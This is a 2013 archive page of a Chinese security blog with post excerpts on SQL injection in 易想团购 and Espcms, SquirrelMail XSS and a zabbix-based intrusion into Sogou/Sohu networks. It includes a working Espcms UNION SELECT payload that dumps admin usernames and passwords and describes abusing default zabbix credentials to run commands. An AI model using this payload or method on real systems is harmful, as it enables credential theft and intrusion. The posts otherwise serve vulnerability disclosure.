<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
  <title>Archives: 2013 | Blog of Secer</title>
  <meta name="description" content="" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="MobileOptimized" content="320" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
  <link rel="stylesheet" type="text/css" href="/css/style.css" />
  <meta name="generator" content="Blog of Secer">

  
  
  

  
</head>

<!--
<body class="home-template">
-->
<body class="home-template">
<div id="perspective" class="perspective effect-movedown">
  <div class="container">
    <!-- wrapper -->
    <div class="wrapper">

      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
    <div class="vertical">
        <div class="site-head-content inner">
             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
            <h1 class="blog-title">Blog of Secer</h1>
            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
        </div>
    </div>
</header>

      
<main class="content" role="main">
  
  <article class="post">
    <header class="post-header">
      <span class="post-meta">
      <time datetime="2013-08-06T02:12:37.000Z" itemprop="datePublished">
          2013-08-06
      </time>
    
</span>
      <h2 class="post-title"><a href="/1019.seo/">易想购物link.php sql注入漏洞</a></h2>
    </header>
    <section class="post-excerpt">
      <p>
      
        易想团购系统link.php页面内代码  if($_REQUEST[‘act’]==’go’)  //link标签 go{    $url = ($_REQUEST[‘url’]);  //直接取了url的值就带入了sql查询语句了    $link_item = $GLOBALS[‘db’]-&gt;getRowCached(&quot;select * from &quot;.DB_PREFIX.&quot;link where (
      
      </p>
      
      <p>
          <a href="/1019.seo/" class="excerpt-link">Read More...</a>
      </p>
      
    </section>
  </article>
  
  <article class="post">
    <header class="post-header">
      <span class="post-meta">
      <time datetime="2013-08-06T01:43:14.000Z" itemprop="datePublished">
          2013-08-06
      </time>
    
</span>
      <h2 class="post-title"><a href="/1018.seo/">Espcms wap 模块SQL注入漏洞</a></h2>
    </header>
    <section class="post-excerpt">
      <p>
      
        <p>发布时间: 2013-07-26</p>  <p>漏洞版本: Espcms v5</p>  <p>漏洞描述: </p>  <p>关闭魔术引号 </p>  <p>变量的传递过程是$_SERVER[‘QUERY_STRING’]-&gt;$urlcode-&gt;$output-&gt;$value-&gt;$db_where-&gt;$sql-&gt;mysql_query，整个过程无过滤导致了注入的发生。   <br />正因为变量是从$_SERVER[‘QUERY_STRING’]中去取的，所以正好避开了程序的过滤。    <br />而注入的变量是数组的值，并非数组的key，所以也没过被过滤，综合起来形成了一个比较少见的SQL注入。    <br />在/interface/3gwap_search.php文件的in_result函数中: </p>  <div>   <pre>function in_result() {<br><br>            … … … … … … … … …<br><br>            //从$_SERVER[‘QUERY_STRING’]中获取数据<br><br>            $urlcode = $_SERVER[ ‘QUERY_STRING ‘];<br><br>            parse_str(html_entity_decode($urlcode), $output);<br><br>            … … … … … … … … …<br><br>            if (is_array($output[‘attr’ ]) &amp;&amp; count($output[‘attr’]) &gt; 0) {<br><br>                  $db_table = db_prefix . ‘model_att’;<br><br>                   foreach ($output[‘attr’ ] as $key =&gt; $value) {<br><br>                         if ($value) {<br><br>                              //对key过滤，忽略了value<br><br>                              $key = addslashes($key);<br><br>                              $key = $this-&gt; fun-&gt;inputcodetrim($key);<br><br>                              $db_att_where = &quot; WHERE isclass=1 AND attrname=’$key’&quot;;<br><br>                              //要求此处$countnum&gt;0<br><br>                              $countnum = $this-&gt;db_numrows($db_table, $db_att_where);<br><br>                               if ($countnum &gt; 0) {<br><br>                                    //value被拼接进入SQL语句<br><br>                                    $db_where .= ‘ AND b.’ . $key . ‘=\’’ . $value . ‘\’’ ;<br><br>                              }<br><br>                        }<br><br>                  }<br><br>            }<br><br>            if (!empty ($keyword) &amp;&amp; empty($keyname)) {<br><br>                  $keyname = ‘title’;<br><br>                  $db_where.= &quot; AND a.title like ‘%$keyword%’&quot; ;<br><br>            } elseif (!empty ($keyword) &amp;&amp; !empty($keyname)) {<br><br>                  $db_where.= &quot; AND $keyname like ‘% $keyword%’&quot;;<br><br>            }<br><br>            $pagemax = 15;<br><br>            $pagesylte = 1;<br><br>             if ($countnum &gt; 0) {<br><br>                  $numpage = ceil($countnum / $pagemax);<br><br>            } else {<br><br>                  $numpage = 1;<br><br>            }<br><br>            //拼接进入SQL语句<br><br>            $sql = &quot;SELECT b.<em>,a.</em> FROM &quot; . db_prefix . &quot;document AS a LEFT JOIN &quot; . db_prefix . &quot;document_attr AS b ON a.did=b.did &quot; . $db_where . ‘ LIMIT 0,’ . $pagemax;<br><br>            $this-&gt; htmlpage = new PageBotton($sql, $pagemax, $page, $countnum, $numpage, $pagesylte, $this-&gt;CON [‘file_fileex’ ], 5, $this-&gt;lng[‘pagebotton’ ], $this-&gt;lng[‘gopageurl’], 0);<br><br>            $sql = $this-&gt; htmlpage-&gt;PageSQL(‘a.did’ , ‘down’ );<br><br>            //被执行<br><br>            $rs = $this-&gt;db-&gt;query($sql);<br><br>            … … … … … … … … …<br><br>      }</pre><br></div><br><br><p>&#160;</p>

<blockquote></blockquote>

<p>Exp:</p>

<blockquote><br>  <p>/wap/index.php?ac=search&amp;at=result&amp;lng=cn&amp;mid=3&amp;tid=11&amp;keyword=1&amp;keyname=a.title&amp;countnum=1&amp;attr[jobnum]=1%27%20and%201=2%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,concat%28username,password%29,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45%20from%20espcms_admin_member;%23</p><br></blockquote>

<p>&#160;</p><br>
      
      </p>
      
      <p>
          <a href="/1018.seo/" class="excerpt-link">Read More...</a>
      </p>
      
    </section>
  </article>
  
  <article class="post">
    <header class="post-header">
      <span class="post-meta">
      <time datetime="2013-08-06T01:32:44.000Z" itemprop="datePublished">
          2013-08-06
      </time>
    
</span>
      <h2 class="post-title"><a href="/1017.seo/">易想团购sms.php SQL注入漏洞分析及利用</a></h2>
    </header>
    <section class="post-excerpt">
      <p>
      
        首发：http://club.freebuf.com/?/question/416  by 0x53sec http://www.freebuf.com/author/0x53sec  易想团购系统sms.php文件里面的几个变量过滤不严格导致了SQL注入漏洞。 部分代码：  &#160;     elseif($_REQUEST[‘act’]==’do_unsubscribe_verify’){    $code = trim($_R
      
      </p>
      
      <p>
          <a href="/1017.seo/" class="excerpt-link">Read More...</a>
      </p>
      
    </section>
  </article>
  
  <article class="post">
    <header class="post-header">
      <span class="post-meta">
      <time datetime="2013-07-25T18:14:31.000Z" itemprop="datePublished">
          2013-07-26
      </time>
    
</span>
      <h2 class="post-title"><a href="/1016.seo/">PHP  将时间显示为 刚刚  n分钟 小时前 等</a></h2>
    </header>
    <section class="post-excerpt">
      <p>
      
        在很多场合为了显示出信息的及时性，一般会将时间显示成“刚刚”，“5分钟前”，“3小时前”等，而不是直接将时间打印出来。比如微博，SNS类应用就最长用到这个功能。而一般存储在数据库中的时间格式为 Unix时间戳，所以这里记录一个将 Unix时间戳 转化为时间轴显示的PHP函数。   函数比较简单，直接看代码就很好懂了。      &lt;?phpdate_default_timezone_set(‘PRC’);$date = &quot;
      
      </p>
      
      <p>
          <a href="/1016.seo/" class="excerpt-link">Read More...</a>
      </p>
      
    </section>
  </article>
  
  <article class="post">
    <header class="post-header">
      <span class="post-meta">
      <time datetime="2013-07-22T18:47:10.000Z" itemprop="datePublished">
          2013-07-23
      </time>
    
    
    | 
    <a href='/tag/xss/'>xss</a>,
    
    <a href='/tag/squirrel-mail/'>squirrel mail</a>
    
    
</span>
      <h2 class="post-title"><a href="/1015.seo/">论升级的重要性,低版本squirrel mail的XSS利用实例</a></h2>
    </header>
    <section class="post-excerpt">
      <p>
      
        <p>低版本的sqmail有几个xss洞…但是没有exploit…这次通过实例补充一下   <br />求不要跨省…我还要读几年书呢    <br />详细说明：    <br />香港科技大学喜欢使用<a href="http://Ha.Cker.In/tag/squirrel mail" target="_blank">squirrel mail</a>作为webmail后端    <br />屡次标榜先进性却不思升级…这不就跪了么    <br />这次实战的洞有CVE-2008-2379    <br />和一个老洞…但是sqmail的最新版好像也没完全修好    <br />先看看科大用的sqmail版本    <br />logout以后任意访问一个需要login的页面就可以了    <br /><a href="http://t.com/dx/wooyun_referer_pic.php?url=http://www.wooyun.org/upload/201306/0714484951b23cf830d7e8a14a83dc9733d6b35b.jpg"><img title="clip_image002" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="438" alt="clip_image002" src="http://img.cker.in/squirrelmailXSS_9766/clip_image002.jpg" width="620" border="0" /></a>    <br />1.4.10a恩…    <br /><a href="http://squirrelmail.org/security/">http://squirrelmail.org/security/</a>    <br />来看看对应版本有什么洞…    <br />我注意到的是    <br />2008-12-04&#160;&#160;&#160;&#160;&#160;&#160;&#160; Cross site scripting in HTML filter&#160;&#160;&#160;&#160;&#160;&#160;&#160; 1.4.0 - 1.4.16&#160;&#160;&#160;&#160;&#160;&#160;&#160; 0&#160;&#160;&#160;&#160;&#160;&#160;&#160; CVE-2008-2379    <br />这个洞…先搜一下网上有没有现成的exploit好了….    <br />…     <br />没有…那就自己研究    <br />先看一下patch    <br /><a href="http://squirrelmail.svn.sourceforge.net/viewvc/squirrelmail/branches/SM-1_4-STABLE/squirrelmail/functions/mime.php?r1=13276&amp;r2=13338&amp;view=patch">http://squirrelmail.svn.sourceforge.net/viewvc/squirrelmail/branches/SM-1_4-STABLE/squirrelmail/functions/mime.php?r1=13276&amp;r2=13338&amp;view=patch</a>    <br />然后抓源码下来研究一番</p><br>
      
      </p>
      
      <p>
          <a href="/1015.seo/" class="excerpt-link">Read More...</a>
      </p>
      
    </section>
  </article>
  
  <article class="post">
    <header class="post-header">
      <span class="post-meta">
      <time datetime="2013-07-09T02:18:46.000Z" itemprop="datePublished">
          2013-07-09
      </time>
    
    
    | 
    <a href='/tag/zabbix/'>zabbix</a>
    
    
</span>
      <h2 class="post-title"><a href="/1014.seo/">看我是如何利用zbbix渗透sogou&sohu内网的</a></h2>
    </header>
    <section class="post-excerpt">
      <p>
      
        <p>手机搜狗好像不是很好用唉；   <br />在乌云浏览搜狗历史漏洞的时候得到220.<em>.</em>.<em>其中的一个ip    <br />具体是那个漏洞记不住了。    <br />对220.</em>.<em>.0/26进行 8080端口扫描，没有啥重大发现    <br />对220.</em>.<em>.0/26进行 80端口扫描，有重大发现了    <br /><a href="http://220">http://220</a>.</em>.<em>.</em>/zabbix/    <br />再往下</p>  <p>&#160;</p>  <p><a href="http://220.181.*.128/zabbix/">http://220.181.*.128/zabbix/</a>   <br />默认口令：admin/zabbix    <br /><a href="http://t.com/dx/wooyun_referer_pic.php?url=http://www.wooyun.org/upload/201305/091757388a1afd9667de6dd56019a79f6802fea6.jpg"><img title="clip_image002" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="311" alt="clip_image002" src="http://img.cker.in/zbbixsogousohu_10160/clip_image002.jpg" width="620" border="0" /></a>    <br />没多少机器，目测是个测试的<a href="http://Ha.Cker.In/tag/zabbix" target="_blank">zabbix</a>？    <br />随便找了个机器 添加了一个items直接使用system.run 跑了一个命令，没有数据返回，确定zabbix agent没有开启system.run 模块    <br />不过zabbix还有一个Scripts的功能，可以对zabbix server 执行任意命令</p><br>
      
      </p>
      
      <p>
          <a href="/1014.seo/" class="excerpt-link">Read More...</a>
      </p>
      
    </section>
  </article>
  
  <nav class="pagination" role="pagination">
    <a class="newer-posts" href="/archives/2013/page/7/">← Newer Posts</a>
    <span class="page-number">Page 8 of 16</span>
    <a class="older-posts" href="/archives/2013/page/9/">Older Posts →</a>
  </nav>
</main>


      
<footer class="site-footer">
  
  <div class="inner">
     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
  </div>
</footer>

      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>

<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/js/index.js"></script>
<script type="text/javascript" src="/js/menu.js"></script>





  </div>
</div>

<nav  class="outer-nav top horizontal">

          <a class="icon-home"  href="/"><span>Home</span></a>

          <a class="icon-news"  href="/archives"><span>Archive</span></a>

          <a class="icon-image"  href="/images"><span>Images</span></a>

          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>

          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>

          <a class="icon-mail"  href="/about/"><span>Contact</span></a>

</nav>

</div>
</body>
</html>
